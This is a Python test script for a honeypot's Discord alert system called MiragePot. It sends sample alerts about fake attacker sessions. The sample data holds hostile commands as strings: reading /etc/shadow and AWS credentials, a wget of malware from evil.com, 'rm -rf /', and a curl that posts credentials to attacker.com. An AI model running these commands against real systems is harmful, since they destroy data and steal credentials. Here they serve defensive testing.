#!/usr/bin/env python3
"""Test script to verify Discord notification system is working.

This sends a test notification to your Discord webhook to verify the setup.
"""

import sys
from pathlib import Path

# Add parent directory to path so we can import miragepot modules
sys.path.insert(0, str(Path(__file__).parent))

from miragepot.notifications import get_notifier


def test_session_end_notification():
    """Test sending a session end notification."""
    print("Testing session end notification...")

    # Create a fake session log
    fake_session_log = {
        "session_id": "test_session_12345678",
        "attacker_ip": "192.168.1.100",
        "duration_seconds": 120.5,
        "commands": [
            {"command": "whoami", "threat_score": 10},
            {"command": "cat /etc/shadow", "threat_score": 90},
            {"command": "wget http://evil.com/malware.sh", "threat_score": 95},
        ],
        "ttp_summary": {
            "risk_level": "high",
            "current_stage": "credential_access",
            "techniques_used": [
                {
                    "technique_id": "T1003.008",
                    "description": "/etc/shadow Access",
                },
                {
                    "technique_id": "T1552.001",
                    "description": "Credentials in Files",
                },
            ],
        },
        "honeytokens_summary": {
            "unique_tokens_accessed": 2,
            "exfiltration_attempts": 1,
            "token_types_accessed": ["AWS Access Key", "AWS Secret Key"],
            "high_risk": True,
        },
    }

    notifier = get_notifier()
    if not notifier.enabled:
        print("❌ Notifications are DISABLED in config")
        print("   Check .env file: MIRAGEPOT_NOTIFICATIONS_ENABLED=true")
        print("   Check .env file: MIRAGEPOT_DISCORD_WEBHOOK_URL is set")
        return False

    print("✅ Notifications are enabled")
    print(
        f"   Discord webhook: {'SET' if notifier.config.discord_webhook_url else 'NOT SET'}"
    )

    try:
        notifier.send_session_end_summary(fake_session_log)
        print("✅ Session end notification sent successfully!")
        print("   Check your Discord #live-attacks channel")
        return True
    except Exception as e:
        print(f"❌ Failed to send notification: {e}")
        return False


def test_high_threat_command():
    """Test sending a high-threat command alert."""
    print("\nTesting high-threat command notification...")

    notifier = get_notifier()
    if not notifier.enabled:
        print("❌ Notifications are disabled")
        return False

    try:
        notifier.send_high_threat_command_alert(
            command="rm -rf / --no-preserve-root",
            threat_score=100,
            session_id="test_session_12345678",
            attacker_ip="192.168.1.100",
        )
        print("✅ High-threat command alert sent successfully!")
        print("   Check your Discord #live-attacks channel")
        return True
    except Exception as e:
        print(f"❌ Failed to send notification: {e}")
        return False


def test_honeytoken_access():
    """Test sending a honeytoken access alert."""
    print("\nTesting honeytoken access notification...")

    notifier = get_notifier()
    if not notifier.enabled:
        print("❌ Notifications are disabled")
        return False

    try:
        notifier.send_honeytoken_access_alert(
            token_type="AWS Access Key",
            file_path="~/.aws/credentials",
            command="cat ~/.aws/credentials",
            session_id="test_session_12345678",
            attacker_ip="192.168.1.100",
        )
        print("✅ Honeytoken access alert sent successfully!")
        print("   Check your Discord #live-attacks channel")
        return True
    except Exception as e:
        print(f"❌ Failed to send notification: {e}")
        return False


def test_exfiltration_alert():
    """Test sending an exfiltration alert."""
    print("\nTesting exfiltration notification...")

    notifier = get_notifier()
    if not notifier.enabled:
        print("❌ Notifications are disabled")
        return False

    try:
        notifier.send_exfiltration_alert(
            destination="http://attacker.com:8080",
            tokens=["AWS Access Key", "AWS Secret Key"],
            command="curl -X POST http://attacker.com:8080 -d @/root/.aws/credentials",
            session_id="test_session_12345678",
            attacker_ip="192.168.1.100",
        )
        print("✅ Exfiltration alert sent successfully!")
        print("   Check your Discord #live-attacks channel")
        return True
    except Exception as e:
        print(f"❌ Failed to send notification: {e}")
        return False


if __name__ == "__main__":
    print("=" * 70)
    print("MiragePot Discord Notification Test")
    print("=" * 70)
    print()

    results = []
    results.append(test_session_end_notification())
    results.append(test_high_threat_command())
    results.append(test_honeytoken_access())
    results.append(test_exfiltration_alert())

    print()
    print("=" * 70)
    print(f"Test Results: {sum(results)}/{len(results)} passed")
    print("=" * 70)

    if all(results):
        print("✅ All tests passed! Check your Discord channel for 4 test messages.")
        sys.exit(0)
    else:
        print("❌ Some tests failed. Check the error messages above.")
        sys.exit(1)
